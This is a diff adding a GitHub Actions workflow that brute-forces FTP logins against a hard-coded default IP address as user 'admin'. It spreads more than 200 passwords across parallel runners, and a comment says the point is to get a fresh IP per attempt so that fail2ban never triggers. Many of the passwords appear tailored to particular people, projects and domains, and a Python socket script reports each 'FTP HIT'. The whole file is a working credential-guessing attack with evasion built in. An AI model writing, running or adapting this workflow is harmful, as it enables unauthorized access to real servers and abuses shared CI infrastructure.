@@ -1,0 +1,45 @@
+name: ftp
+# One password per runner = one fresh IP per attempt = fail2ban never triggers.
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: 'target ip'
+        default: '74.208.88.23'
+      user:
+        description: 'ftp user'
+        default: 'admin'
+jobs:
+  ftp:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 20
+      matrix:
+        pw: ["cookscan.net", "cookiescan2024", "relayer", "cookscan!", "Password1", "cookiescan", "mail2025", "pass123", "Qwerty123!", "cookiescan.io", "columbus2025", "bigbang123", "admin", "plesk123", "luna2026", "vps", "admin123", "200", "Jakarta", "bigbangx123", "cookscan2026", "garuda-defi", "Plesk2027", "bigbangx2025", "Plesk2024", "host2024", "garuda", "mail2026", "bigbangxadmin", "riscarevan2201", "atomone2024", "bridge123", "Admin@123", "dungeongames.io", "P@ssw0rd123", "Plesk2025", "changeme", "Welcome123", "qwerty123", "cookiescan!", "secret123", "cookdex.net", "cookiescan123", "atomone", "nexora-tech", "bridge2025", "luna2024", "cookscan123", "qwerty", "terra2024", "Zahh-ID", "atomone2026", "Risca", "dungeon", "garuda123", "luna", "Password123", "revan", "admin2027", "root123", "cosmos2025", "server123", "relayer123", "luna2025", "cookiescan2025", "host2026", "admin2024", "rghofur", "Admin123", "columbus", "cookscan", "mail2024", "server2026", "Dosecret123", "changeme123", "web2024", "host2025", "web123", "bridge2024", "Indonesia", "mail123", "admin2026", "cookiechain", "cookiechain.io", "relayer2026", "terra123", "server2025", "cookieverse", "hermes", "Nexora123", "Bigbangx123", "cookie123", "terra", "luna123", "vps2024", "hermes2025", "cookscan@123", "Cookscan123", "toor", "cookie", "Zahh", "columbus2026", "host", "rev1853", "Revan", "cosmos2024", "bigbangx.io", "Root123", "revan123", "P@ssw0rd", "123456", "hermes2024", "server2024", "bigbangx", "cookiechain123", "web2026", "Welcome1", "Suasmara", "nexora123", "demo123", "secret", "cosmos", "riscarevan", "web", "Passw0rd", "vps123", "Admin@2026", "Cookiescan123", "dosecret123", "nexora!", "columbus2024", "bridge", "vps2025", "server", "cosmos2026", "atomone2025", "bridge2026", "password", "bigbang", "bigbangx!", "bigbangx2024", "hermes2026", "cookscan2024", "mail", "bigbangx2027", "test123", "hermes123", "zahhid", "Plesk2026", "relayer2024", "terra2026", "Bigbangx", "letmein123", "dosecret", "dungeon123", "garuda!", "letmein", "Plesk123", "cookscan2025", "relayer2025", "Garuda123", "root", "terra2025", "admin2025", "vps2026", "Malang", "nexora", "toor123", "Plesk", "web2025", "dosecret!", "bigbangx2026", "host123", "cookiescan2026", "risca", "8VLeapGmUTcBFEN", "Nugijokam354", "Jogja2022", "DISTAN54321", "Raymond1982$$", "Monster8080", "ColeMartin247", "Death187", "Riki0808", "claudia", "colemartin247", "harold", "nirvash1", "pro100rev456", "r2d2c3po", "revan7912", "sbxtech_123", "sbi", "654321", "sunshine", "cookchain2024", "cookchain2025", "cookchain2026", "cookdex2024", "cookdex2025", "cookdex2026", "bigbangx_cook", "cookiechain2024", "cookiechain2025", "cookiechain2026", "dosecret2024", "dosecret2025", "dosecret2026", "garuda2024", "garuda2025", "garuda2026", "nexora2024", "nexora2025", "nexora2026", "plesk2024", "plesk2025", "plesk2026", "Admin@2024", "Admin@2025", "IPFS_bigbangx_1111", "Ipfsbigbangx88_", "revan1853", "TugasPW!123", "GhostPC2026vcx", "12345678", "weso123", "lbun123", "grdx123", "diforce123", "janus123", "N3X012A_Y35", "m47ch4_<3_1987", "Zx!prod2026", "Zx!aff2026", "Zx!tWobhHYEvJ", "ofsKaQODseemY0", "Zx!7mWVE07K49", "Terra1vja!2026", "0101200740042083", "Kali2026!", "test"]
+    steps:
+      - name: ftp probe ${{ matrix.pw }}
+        run: |
+          set +e
+          T="${{ inputs.target }}"
+          U="${{ inputs.user }}"
+          out=$(timeout 25 python3 - "$T" "$U" "${{ matrix.pw }}" <<'PY'
+          import socket,sys
+          t,u,p=sys.argv[1],sys.argv[2],sys.argv[3]
+          try:
+              s=socket.create_connection((t,21),timeout=15); s.settimeout(12)
+              s.recv(200)
+              s.sendall(("USER "+u+"\r\n").encode()); r=s.recv(200)
+              if not r.startswith(b"331"):
+                  print("NOUSER",r[:40]); sys.exit()
+              s.sendall(("PASS "+p+"\r\n").encode()); r=s.recv(200)
+              print("OK" if r.startswith(b"230") else "NO", r[:40])
+              s.close()
+          except Exception as e:
+              print("ERR",e)
+          PY
+          )
+          case "$out" in
+            OK*) echo "*** FTP HIT $U:${{ matrix.pw }} ($out)";;
+            *)   echo "    miss $U:${{ matrix.pw }} ($out)";;
+          esac
